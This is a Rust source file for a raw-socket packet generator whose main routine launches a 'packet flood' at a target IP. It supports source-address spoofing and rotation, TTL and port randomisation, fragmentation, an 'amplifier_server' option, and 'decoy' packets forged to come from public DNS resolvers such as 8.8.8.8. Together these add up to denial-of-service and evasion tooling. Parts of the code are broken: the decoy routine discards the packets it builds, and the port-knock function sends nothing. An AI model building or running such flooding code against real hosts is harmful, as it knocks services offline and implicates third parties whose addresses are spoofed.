use crate::packet_builders::*;
use crate::protocol::ProtocolType;
use log::{error, info};
use pcap::{Capture, Linktype, Packet as PcapPacket};
use std::io::{self, ErrorKind};
use std::net::Ipv4Addr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::sync::Mutex;
use std::thread;
use std::time::{Duration, Instant};
use rand::Rng;
use rand::seq::SliceRandom;
use libc::{AF_INET, SOCK_RAW, IPPROTO_RAW, IPPROTO_TCP, IPPROTO_UDP, IPPROTO_ICMP};
use colored::*;

#[derive(Clone)]
pub struct PacketGenerator {
    pub source_ip: Ipv4Addr,
    pub target_ip: Ipv4Addr,
    pub protocol: ProtocolType,
    pub payload: Vec<u8>,
    pub ttl: u8,
    pub randomize: bool,
    pub running: Arc<AtomicBool>,
    pub packets_sent: Arc<Mutex<usize>>,
    pub rate_limit_ms: u64,
    pub pcap_file: Option<String>,
    pub tcp_flags: u16,
    pub icmp_type: u8,
    pub udp_dest_port: u16,
    pub burst_size: usize,
    pub delay: u64,
    pub amplifier_server: Option<Ipv4Addr>,
    pub randomize_source: bool,
    pub randomize_delay: bool,
    pub fragment_packets: bool,
    pub spoof_ttl: bool,
    pub rotate_ports: bool,
    pub rotate_ips: bool,
    pub common_ports: Vec<u16>,
    pub decoy_scan: bool,
    pub ip_rotation_range: Option<(Ipv4Addr, Ipv4Addr)>,
}

impl PacketGenerator {
    pub fn new(
        source_ip: Ipv4Addr,
        target_ip: Ipv4Addr,
        protocol: ProtocolType,
        payload: Vec<u8>,
        ttl: u8,
        randomize: bool,
        rate_limit_ms: u64,
        pcap_file: Option<String>,
        tcp_flags: u16,
        icmp_type: u8,
        udp_dest_port: u16,
        burst_size: usize,
        delay: u64,
        amplifier_server: Option<Ipv4Addr>,
        randomize_source: bool,
        randomize_delay: bool,
        fragment_packets: bool,
        spoof_ttl: bool,
        rotate_ports: bool,
        rotate_ips: bool,
        common_ports: Vec<u16>,
        decoy_scan: bool,
        ip_rotation_range: Option<(Ipv4Addr, Ipv4Addr)>,
    ) -> Self {
        PacketGenerator {
            source_ip,
            target_ip,
            protocol,
            payload,
            ttl,
            randomize,
            running: Arc::new(AtomicBool::new(true)),
            packets_sent: Arc::new(Mutex::new(0)),
            rate_limit_ms,
            pcap_file,
            tcp_flags,
            icmp_type,
            udp_dest_port,
            burst_size,
            delay,
            amplifier_server,
            randomize_source,
            randomize_delay,
            fragment_packets,
            spoof_ttl,
            rotate_ports,
            rotate_ips,
            common_ports,
            decoy_scan,
            ip_rotation_range,
        }
    }

    pub fn parse_tcp_flags(flags: &str) -> u16 {
        let mut tcp_flags: u16 = 0;
        for flag in flags.split(',') {
            match flag.trim().to_uppercase().as_str() {
                "SYN" => tcp_flags |= 0x0002,
                "ACK" => tcp_flags |= 0x0010,
                "FIN" => tcp_flags |= 0x0001,
                "RST" => tcp_flags |= 0x0004,
                "PSH" => tcp_flags |= 0x0008,
                "URG" => tcp_flags |= 0x0020,
                "ECE" => tcp_flags |= 0x0040,
                "CWR" => tcp_flags |= 0x0080,
                _ => error!("Invalid TCP flag: {}", flag),
            }
        }
        tcp_flags
    }

    pub fn get_random_ttl(&self) -> u8 {
        const COMMON_TTLS: [u8; 4] = [64, 128, 255, 32];
        *COMMON_TTLS.choose(&mut rand::thread_rng()).unwrap()
    }

    pub fn get_random_port(&self) -> u16 {
        const COMMON_PORTS: [u16; 8] = [80, 443, 53, 25, 110, 143, 993, 995];
        *COMMON_PORTS.choose(&mut rand::thread_rng()).unwrap()
    }

    pub fn get_rotated_ip(&self) -> Ipv4Addr {
        if let Some((start, end)) = self.ip_rotation_range {
            let start_u32 = u32::from_be_bytes(start.octets());
            let end_u32 = u32::from_be_bytes(end.octets());
            let random_ip = rand::thread_rng().gen_range(start_u32..=end_u32);
            Ipv4Addr::from(random_ip)
        } else {
            self.source_ip
        }
    }

    pub fn send_packet(&self) -> Result<(), io::Error> {
        let protocol = match self.protocol {
            ProtocolType::ICMP => IPPROTO_ICMP,
            ProtocolType::TCP => IPPROTO_TCP,
            ProtocolType::UDP => IPPROTO_UDP,
            ProtocolType::ARP | ProtocolType::RAW => IPPROTO_RAW,
        };

        // Create raw socket using libc
        let sock_fd = unsafe {
            libc::socket(AF_INET, SOCK_RAW, protocol)
        };
        
        if sock_fd < 0 {
            let err = io::Error::last_os_error();
            error!("Failed to create socket: {}", err);
            return Err(err);
        }

        // Set socket options
        unsafe {
            // Allow socket to send to broadcast address
            let broadcast: i32 = 1;
            if libc::setsockopt(
                sock_fd,
                libc::SOL_SOCKET,
                libc::SO_BROADCAST,
                &broadcast as *const i32 as *const libc::c_void,
                std::mem::size_of::<i32>() as u32,
            ) < 0 {
                let err = io::Error::last_os_error();
                libc::close(sock_fd);
                error!("Failed to set SO_BROADCAST: {}", err);
                return Err(err);
            }
        }

        // Set up the destination address
        let mut dest_addr: libc::sockaddr_in = unsafe { std::mem::zeroed() };
        dest_addr.sin_family = AF_INET as u16;
        dest_addr.sin_port = 0;  // Not used for raw sockets
        dest_addr.sin_addr.s_addr = u32::from_be_bytes(self.target_ip.octets());

        let mut buffer = [0u8; 65535];
        let effective_ttl = if self.spoof_ttl {
            self.get_random_ttl()
        } else {
            self.ttl
        };

        let effective_source = if self.rotate_ips {
            self.get_rotated_ip()
        } else {
            self.source_ip
        };

        let packet_len = match self.protocol {
            ProtocolType::ICMP => {
                let builder = IcmpPacketBuilder::new(
                    effective_source,
                    self.target_ip,
                    self.icmp_type,
                    self.payload.clone(),
                    effective_ttl,
                    self.amplifier_server,
                );
                let len = builder.build_packet(&mut buffer);
                // builder.visualize_packet(&buffer[..len]);
                len
            }
            ProtocolType::TCP => {
                let builder = TcpPacketBuilder::new(
                    effective_source,
                    self.target_ip,
                    self.tcp_flags,
                    self.payload.clone(),
                    self.rotate_ports,
                    effective_ttl,
                    self.amplifier_server,
                );
                
                if self.fragment_packets {
                    builder.build_fragmented_packet(&mut buffer)
                } else {
                    builder.build_packet(&mut buffer)
                }
            }
            ProtocolType::UDP => {
                let builder = UdpPacketBuilder::new(
                    effective_source,
                    self.target_ip,
                    self.udp_dest_port,
                    self.payload.clone(),
                    self.randomize,
                    effective_ttl,
                    self.amplifier_server,
                );
                builder.build_packet(&mut buffer)
            }
            ProtocolType::ARP => {
                let builder = ArpPacketBuilder::new(effective_source, self.target_ip, effective_ttl);
                builder.build_packet(&mut buffer)
            }
            ProtocolType::RAW => {
                let builder = RawPacketBuilder::new(
                    effective_source,
                    self.target_ip,
                    self.payload.clone(),
                    effective_ttl,
                    self.amplifier_server,
                );
                builder.build_packet(&mut buffer)
            }
        };

        // Apply decoy packets if enabled
        if self.decoy_scan {
            self.send_decoy_packets()?;
        }

        // Send to specific destination
        let bytes_written = unsafe {
            libc::sendto(
                sock_fd,
                buffer.as_ptr() as *const libc::c_void,
                packet_len,
                0,
                &dest_addr as *const libc::sockaddr_in as *const libc::sockaddr,
                std::mem::size_of::<libc::sockaddr_in>() as u32,
            )
        };

        if bytes_written < 0 {
            let err = io::Error::last_os_error();
            unsafe { libc::close(sock_fd) };
            return Err(err);
        }

        // Close socket
        unsafe { libc::close(sock_fd) };

        if let Some(ref pcap_file) = self.pcap_file {
            self.write_to_pcap(pcap_file, &buffer[..packet_len])?;
        }

        let mut packets_sent = self.packets_sent.lock().expect("Failed to lock mutex");
        *packets_sent += 1;
        Ok(())
    }

    fn write_to_pcap(&self, file_path: &str, packet: &[u8]) -> Result<(), io::Error> {
        let capture = Capture::dead(Linktype::RAW).map_err(|e| {
            io::Error::new(
                ErrorKind::Other,
                format!("Failed to create capture: {}", e),
            )
        })?;

        let mut savefile = capture.savefile(file_path).map_err(|e| {
            io::Error::new(
                ErrorKind::Other,
                format!("Failed to create savefile: {}", e),
            )
        })?;

        let header = pcap::PacketHeader {
            ts: libc::timeval {
                tv_sec: 0,
                tv_usec: 0,
            },
            caplen: packet.len() as u32,
            len: packet.len() as u32,
        };

        let pcap_packet = PcapPacket::new(&header, packet);
        savefile.write(&pcap_packet);
        Ok(())
    }

    fn send_decoy_packets(&self) -> Result<(), io::Error> {
        let decoy_ips = [
            "8.8.8.8", "1.1.1.1", "208.67.222.222",
            "9.9.9.9", "64.6.64.6", "208.67.220.220"
        ].iter()
            .filter_map(|ip| ip.parse::<Ipv4Addr>().ok());

        for decoy_ip in decoy_ips {
            // Handle each protocol type separately
            match self.protocol {
                ProtocolType::TCP => {
                    let builder = TcpPacketBuilder::new(
                        decoy_ip,
                        self.target_ip,
                        self.tcp_flags,
                        self.payload.clone(),
                        true,
                        self.get_random_ttl(),
                        None,
                    );
                    let mut buffer = [0u8; 65535];
                    builder.build_packet(&mut buffer);
                },
                ProtocolType::UDP => {
                    let builder = UdpPacketBuilder::new(
                        decoy_ip,
                        self.target_ip,
                        self.get_random_port(),
                        self.payload.clone(),
                        true,
                        self.get_random_ttl(),
                        None,
                    );
                    let mut buffer = [0u8; 65535];
                    builder.build_packet(&mut buffer);
                },
                _ => continue,
            }
            self.send_packet()?;
        }
        Ok(())
    }

    pub fn start_packet_flood(&self, timeout: Option<u64>) {
        // Print packet configuration summary
        println!("\n{}", "Packet Configuration Summary:".bold());
        println!("╔════════════════════╦═══════════════════════════════╗");
        println!("║ Parameter          ║ Value                         ║");
        println!("╠════════════════════╬═══════════════════════════════╣");
        println!("║ Source IP          ║ {:<29} ║", self.source_ip);
        println!("║ Target IP          ║ {:<29} ║", self.target_ip);
        println!("║ Protocol           ║ {:<29} ║", self.protocol);
        println!("║ TTL                ║ {:<29} ║", self.ttl);
        println!("║ Rate Limit         ║ {:<29} ║", format!("{} ms", self.rate_limit_ms));
        if let Some(timeout) = timeout {
            println!("║ Timeout            ║ {:<29} ║", format!("{} sec", timeout));
        }
        println!("╚════════════════════╩═══════════════════════════════╝");
        println!("\n{}", "Starting packet flood...".green());

        let running = Arc::clone(&self.running);
        let packet_generator = Arc::new(self.clone());
        let start_time = Instant::now();
        let timeout_duration = timeout.map(Duration::from_secs);
        let mut last_status_time = Instant::now();
        const STATUS_INTERVAL: Duration = Duration::from_secs(1);

        thread::spawn(move || {
            let mut last_send_time = Instant::now();
            let mut rng = rand::thread_rng();
            let mut packets_in_burst = 0;
            let mut consecutive_errors = 0;
            let mut error_shown = false;
            const MAX_CONSECUTIVE_ERRORS: u32 = 5;

            while running.load(Ordering::SeqCst) {
                if let Some(timeout) = timeout_duration {
                    if start_time.elapsed() >= timeout {
                        info!("Timeout reached. Stopping packet flooding.");
                        break;
                    }
                }

                // Show status every second
                if last_status_time.elapsed() >= STATUS_INTERVAL {
                    let packets = *packet_generator.packets_sent.lock().unwrap();
                    let elapsed = start_time.elapsed().as_secs_f64();
                    let rate = packets as f64 / elapsed;
                    info!("Sent {} packets ({:.0} packets/sec)", packets, rate);
                    last_status_time = Instant::now();
                }

                if packet_generator.burst_size > 0 && packets_in_burst < packet_generator.burst_size {
                    match packet_generator.send_packet() {
                        Ok(_) => {
                            consecutive_errors = 0;
                            error_shown = false;
                        },
                        Err(err) => {
                            consecutive_errors += 1;
                            if consecutive_errors >= MAX_CONSECUTIVE_ERRORS && !error_shown {
                                error!("Multiple consecutive errors occurred: {}", err);
                                if err.kind() == ErrorKind::PermissionDenied {
                                    error!("Insufficient privileges. Please run with sudo.");
                                }
                                error_shown = true;
                                break;
                            }
                        }
                    }
                    packets_in_burst += 1;
                } else {
                    if packet_generator.burst_size > 0 {
                        packets_in_burst = 0;
                        let mut delay = packet_generator.delay;
                        if packet_generator.randomize_delay {
                            delay = rng.gen_range(0..packet_generator.delay);
                        }
                        thread::sleep(Duration::from_millis(delay));
                    }

                    let elapsed = last_send_time.elapsed();
                    if elapsed >= Duration::from_millis(packet_generator.rate_limit_ms) {
                        match packet_generator.send_packet() {
                            Ok(_) => {
                                consecutive_errors = 0;
                                error_shown = false;
                            },
                            Err(err) => {
                                consecutive_errors += 1;
                                if consecutive_errors >= MAX_CONSECUTIVE_ERRORS && !error_shown {
                                    error!("Multiple consecutive errors occurred: {}", err);
                                    error_shown = true;
                                    break;
                                }
                            }
                        }
                        last_send_time = Instant::now();
                    } else if packet_generator.burst_size == 0 {
                        thread::sleep(Duration::from_micros(100));
                    }
                }
            }

            let end_time = Instant::now();
            let elapsed_time = end_time.duration_since(start_time);
            let total_packets = *packet_generator.packets_sent.lock().unwrap();
            
            
            if total_packets > 0 {
                info!(
                    "Packet flood completed: Sent {} packets in {:.2?} ({:.0} packets/sec)",
                    total_packets, 
                    elapsed_time,
                    total_packets as f64 / elapsed_time.as_secs_f64()
                );
            } else {
                error!("No packets were sent successfully. Please check your network configuration and permissions.");
            }
        });
    }

    pub fn stop_packet_flood(&self) {
        self.running.store(false, Ordering::SeqCst);
    }

    pub fn send_port_knock_sequence(&self) -> Result<(), io::Error> {
        // Common port knocking sequence
        let knock_sequence = vec![7000, 8000, 9000];
        
        for port in knock_sequence {
            let builder = TcpPacketBuilder::new(
                self.source_ip,
                self.target_ip,
                0x002, // SYN flag
                Vec::new(),
                false,
                self.ttl,
                None,
            );
            
            let mut buffer = [0u8; 65535];
            let len = builder.build_packet(&mut buffer);
            // Send knock packet
            // ... sending code ...
            
            thread::sleep(Duration::from_millis(100));
        }
        Ok(())
    }
} 